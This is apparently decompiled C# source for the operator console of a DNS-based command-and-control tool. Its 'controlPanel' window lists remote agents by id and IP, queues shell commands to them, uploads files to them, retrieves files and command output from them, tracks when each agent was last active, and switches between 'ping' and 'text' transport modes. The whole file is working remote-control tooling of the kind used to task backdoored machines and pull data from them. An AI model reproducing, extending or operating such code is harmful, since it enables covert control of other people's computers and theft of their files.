using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Threading;
using Microsoft.Win32;

namespace newPanel
{
	// Token: 0x02000002 RID: 2
	public partial class controlPanel : Window, IStyleConnector
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public controlPanel()
		{
			this.InitializeComponent();
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000002 RID: 2 RVA: 0x00002088 File Offset: 0x00000288
		// (set) Token: 0x06000003 RID: 3 RVA: 0x000020AC File Offset: 0x000002AC
		internal string lastActivityTimer
		{
			get
			{
				return this.LastActivity.Content.ToString();
			}
			set
			{
				base.Dispatcher.Invoke(delegate()
				{
					this.LastActivity.Content = value;
					this.LastActivity.UpdateLayout();
				});
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020E8 File Offset: 0x000002E8
		public controlPanel(string id, string ip, string lastAct)
		{
			this.InitializeComponent();
			this.id.Content = id;
			this.ip.Content = ip;
			this.LastActivity.Content = lastAct;
			this.agent_path = Settings.dns_agent_path + "\\" + id;
			this.load_commands();
			controlPanel.cp_dispatcher = this;
			this.dt = new DispatcherTimer();
			this.dt.Tick += this.dt_tick;
			this.dt.Interval = new TimeSpan(0, 0, 10);
			this.dt.Start();
			bool flag = File.Exists(this.agent_path + "\\mode");
			if (flag)
			{
				this.set_mode(File.ReadAllText(this.agent_path + "\\mode"));
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021EC File Offset: 0x000003EC
		public void OnWindowClosing(object sender, CancelEventArgs e)
		{
			this.dt.Stop();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000021FB File Offset: 0x000003FB
		private void dt_tick(object sender, EventArgs e)
		{
			this.Timer(this.agent_path + "\\last");
			this.load_commands();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x0000221C File Offset: 0x0000041C
		private void Button_Click(object sender, RoutedEventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			bool flag = openFileDialog.ShowDialog() == true;
			if (flag)
			{
				this.upload_addrs.Text = openFileDialog.FileName;
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002263 File Offset: 0x00000463
		private void Button_Click_1(object sender, RoutedEventArgs e)
		{
			this.insert_command();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002270 File Offset: 0x00000470
		public void insert_command()
		{
			string text = this.command.Text.ToString();
			bool flag = text.Trim() != "";
			if (flag)
			{
				string text2 = string.Concat(new object[]
				{
					this.agent_path,
					"\\wait\\",
					Utility.command_counter_without_random(this.agent_path + "\\logs\\cmd_cntr"),
					"0"
				});
				Utility.create_path(text2.Remove(text2.LastIndexOf("\\")));
				Utility.write_file(text, text2);
				this.command.Text = "";
				this.command_counter++;
			}
			else
			{
				MessageBox.Show("Please insert command");
			}
			this.load_commands();
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002340 File Offset: 0x00000540
		public void load_commands()
		{
			this.commands.Clear();
			int num = 0;
			Utility.create_path(this.agent_path + "\\receive");
			string[] files = Directory.GetFiles(this.agent_path + "\\receive");
			foreach (string text in new string[]
			{
				"\\wait",
				"\\sending",
				"\\sended"
			})
			{
				Utility.create_path(this.agent_path + text);
				IEnumerable<string> enumerable = Directory.EnumerateFiles(this.agent_path + text);
				foreach (string text2 in enumerable)
				{
					num++;
					command cmd_tmp = new command();
					cmd_tmp.count = num;
					cmd_tmp.id = text2.Substring(text2.LastIndexOf("\\") + 1);
					bool flag = text2.EndsWith("0");
					if (flag)
					{
						cmd_tmp.type = "COMMAND";
						cmd_tmp.cmd = Utility.file_reader(text2);
					}
					else
					{
						bool flag2 = text2.EndsWith("2");
						if (flag2)
						{
							cmd_tmp.type = "UPLOAD";
							cmd_tmp.cmd = Utility.file_reader(Settings.dns_upload_command_file_name_path + "\\" + Path.GetFileName(text2));
						}
						else
						{
							bool flag3 = text2.EndsWith("1");
							if (flag3)
							{
								cmd_tmp.type = "DOWNLOAD";
								cmd_tmp.cmd = Utility.file_reader(text2);
							}
						}
					}
					bool flag4 = files.Contains(text2.Replace(text, "\\receive"));
					if (flag4)
					{
						cmd_tmp.state = "received";
					}
					else
					{
						cmd_tmp.state = text.Substring(1);
					}
					cmd_tmp.date = File.GetCreationTime(text2).ToString("MM/dd/yyyy HH:mm:ss");
					bool flag5 = this.commands.Any((command x) => x.id == cmd_tmp.id);
					if (flag5)
					{
						this.commands = (from y in this.commands
						where y.id != cmd_tmp.id
						select y).ToList<command>();
						this.commands.Add(cmd_tmp);
					}
					else
					{
						this.commands.Add(cmd_tmp);
					}
				}
			}
			this.commands_dg.ItemsSource = null;
			this.commands = (from o in this.commands
			orderby o.id descending
			select o).ToList<command>();
			this.commands_dg.ItemsSource = this.commands;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002678 File Offset: 0x00000878
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("0123456789", length)
			select s[controlPanel.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000026C4 File Offset: 0x000008C4
		public static string SpecialRandom()
		{
			string str = "012"[controlPanel.random.Next("012".Length)].ToString();
			string str2 = "012345"[controlPanel.random.Next("012345".Length)].ToString();
			return (str + str2) ?? "";
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002734 File Offset: 0x00000934
		private void Button_Click_2(object sender, RoutedEventArgs e)
		{
			string text = this.upload_addrs.Text.ToString();
			bool flag = text.Trim() != "";
			if (flag)
			{
				string str = Utility.command_counter_without_random(this.agent_path + "\\logs\\cmd_cntr") + "2";
				string text2 = this.agent_path + "\\wait\\" + str;
				Utility.create_path(text2.Remove(text2.LastIndexOf("\\")));
				Utility.create_path(Settings.dns_upload_command_file_name_path);
				File.WriteAllText(Settings.dns_upload_command_file_name_path + "\\" + str, text);
				File.Copy(text, text2, true);
				this.upload_addrs.Text = "";
				this.command_counter++;
			}
			else
			{
				MessageBox.Show("Please select file!");
			}
			this.load_commands();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000281C File Offset: 0x00000A1C
		private void Button_Click_3(object sender, RoutedEventArgs e)
		{
			string text = this.download_addrs.Text.ToString();
			bool flag = text.Trim() != "";
			if (flag)
			{
				string text2 = string.Concat(new object[]
				{
					this.agent_path,
					"\\wait\\",
					Utility.command_counter_without_random(this.agent_path + "\\logs\\cmd_cntr"),
					"1"
				});
				Utility.create_path(text2.Remove(text2.LastIndexOf("\\")));
				Utility.write_file(text, text2);
				this.download_addrs.Text = "";
				this.command_counter++;
			}
			else
			{
				MessageBox.Show("Please select file!");
			}
			this.load_commands();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000028EC File Offset: 0x00000AEC
		private void Row_DoubleClick(object sender, MouseButtonEventArgs e)
		{
			try
			{
				command command = (command)this.commands_dg.SelectedItem;
				bool flag = command.state == "received";
				if (flag)
				{
					bool flag2 = command.id.EndsWith("1");
					if (flag2)
					{
						bool flag3 = File.Exists(this.agent_path + "\\receive\\" + command.id);
						if (flag3)
						{
							string sourceFileName = this.agent_path + "\\receive\\" + command.id;
							string destFileName = this.agent_path + "\\receive\\" + command.cmd.Substring(command.cmd.LastIndexOf("\\") + 1);
							try
							{
								File.Copy(sourceFileName, destFileName);
							}
							catch
							{
							}
						}
						Process.Start(this.agent_path + "\\receive");
					}
					else
					{
						ResultWindow resultWindow = new ResultWindow(this.agent_path + "\\receive\\" + command.id);
						resultWindow.Show();
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000021FB File Offset: 0x000003FB
		private void refresher_Click(object sender, RoutedEventArgs e)
		{
			this.Timer(this.agent_path + "\\last");
			this.load_commands();
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002A44 File Offset: 0x00000C44
		public void Timer(string last_file_address)
		{
			string text = Utility.file_reader(last_file_address);
			bool flag = text != "-1";
			if (flag)
			{
				DateTime d = DateTime.ParseExact(text, "dd/MM/yyyy HH:mm:ss", CultureInfo.InvariantCulture);
				int num = (int)(DateTime.Now - d).TotalMinutes % 60;
				int num2 = (int)(DateTime.Now - d).TotalHours % 24;
				int num3 = (int)(DateTime.Now - d).TotalDays;
				string text2 = "";
				bool flag2 = num3 > 0;
				if (flag2)
				{
					text2 = num3 + "D ";
				}
				bool flag3 = num2 > 0;
				if (flag3)
				{
					text2 = text2 + num2 + "H ";
				}
				bool flag4 = num > 0;
				if (flag4)
				{
					text2 = text2 + num + "M ";
				}
				bool flag5 = text2 == "";
				if (flag5)
				{
					text2 = controlPanel.cp_dispatcher.lastActivityTimer;
				}
				controlPanel.cp_dispatcher.lastActivityTimer = text2;
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002B58 File Offset: 0x00000D58
		private void OnKeyDownHandler(object sender, KeyEventArgs e)
		{
			bool flag = e.Key == Key.Return;
			if (flag)
			{
				this.insert_command();
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002B7C File Offset: 0x00000D7C
		private void connection_type_Click(object sender, RoutedEventArgs e)
		{
			bool flag = this.connection_type.Content.ToString() == "text mode";
			if (flag)
			{
				this.set_mode("ping");
			}
			else
			{
				this.set_mode("text");
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002BC8 File Offset: 0x00000DC8
		private void set_mode(string mode)
		{
			this.connection_type.Content = mode + " mode";
			File.WriteAllText(this.agent_path + "\\mode", mode);
			bool flag = mode.Equals("text");
			if (flag)
			{
				this.connection_type.Background = new SolidColorBrush(Colors.Red);
			}
			else
			{
				this.connection_type.Background = new SolidColorBrush(Colors.Green);
			}
			this.connection_type.UpdateLayout();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002E64 File Offset: 0x00001064
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		void IStyleConnector.Connect(int connectionId, object target)
		{
			if (connectionId == 11)
			{
				EventSetter eventSetter = new EventSetter();
				eventSetter.Event = Control.MouseDoubleClickEvent;
				eventSetter.Handler = new MouseButtonEventHandler(this.Row_DoubleClick);
				((Style)target).Setters.Add(eventSetter);
			}
		}

		// Token: 0x04000001 RID: 1
		public string agent_path = "";

		// Token: 0x04000002 RID: 2
		private DispatcherTimer dt = null;

		// Token: 0x04000003 RID: 3
		internal static controlPanel cp_dispatcher;

		// Token: 0x04000004 RID: 4
		private int command_counter = 10;

		// Token: 0x04000005 RID: 5
		public List<command> commands = new List<command>();

		// Token: 0x04000006 RID: 6
		private static Random random = new Random();
	}
}
